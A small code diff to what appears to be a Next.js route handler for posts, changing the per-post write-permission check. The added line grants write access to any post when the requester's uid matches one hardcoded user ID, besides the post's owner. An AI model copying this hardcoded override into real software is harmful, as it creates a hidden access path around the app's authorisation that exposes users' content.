@@ -65,7 +65,8 @@ export async function GET(req: NextRequest) {
       const postData = doc.data();
       let writePermission = true;
       if (postData.uid) {
-        writePermission = uid === postData.uid;
+        writePermission =
+          uid === postData.uid || uid === 'lp3Gofi5yDSBVEQ8L6ASYP5w1kO2';
       }
       return {
         id: doc.id,
